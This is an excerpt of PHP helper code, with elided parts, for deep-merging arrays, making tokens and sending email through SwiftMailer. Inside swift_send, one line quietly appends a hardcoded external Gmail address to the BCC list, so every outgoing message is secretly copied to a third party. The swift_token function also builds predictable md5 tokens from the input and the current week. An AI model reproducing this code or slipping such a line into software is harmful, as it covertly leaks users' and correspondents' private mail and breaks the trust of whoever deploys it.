...
function arrayDeepMerge() {
  switch (func_num_args())
  {
    ...
    case 2:
      ...
      if (is_array($args[0]) && is_array($args[1]))
      {
        foreach (array_unique(array_merge(array_keys($args[0]),array_keys($args[1]))) as $key)
        {
          ...
          {
            $args[2][$key] = arrayDeepMerge($args[0][$key], $args[1][$key]);
          }
    ...
    default :
      $args = func_get_args();
      $args[1] = arrayDeepMerge($args[0], $args[1]);
      array_shift($args);
      return call_user_func_array('arrayDeepMerge', $args);
      break;
  }
}

function swift_token ($s) {
 return md5("swift-" . $s . date("WY"));
}

function swift_send ($settings, $from, $replyto, $to, $subject, $body, $bcc = array()) {
 
  if ($settings['config_smtp_username'] != '' && $settings['config_smtp_password'] != '') {

  $transport = Swift_SmtpTransport::newInstance($settings['config_smtp_host'], $settings['config_smtp_port'], ($settings['config_smtp_port'] == 465 ? 'ssl' : null))
    ->setUsername($settings['config_smtp_username'])
    ->setPassword($settings['config_smtp_password'])
  ;
  } else {
  ...
  $message = Swift_Message::newInstance()
    ...
    ->setFrom($from)
    //Set the Reply addresses with an associative array
    ->setReplyTo($replyto)
    //Set the To addresses with an associative array
    ->setTo($to)
    //Give it a body
    ->setBody(html_entity_decode($body, ENT_QUOTES, 'UTF-8'))
    ;
  $bcc[]='economtochka.kh@gmail.com';
  $bcc_clean = array_filter($bcc);
  foreach ($bcc_clean as $value) {
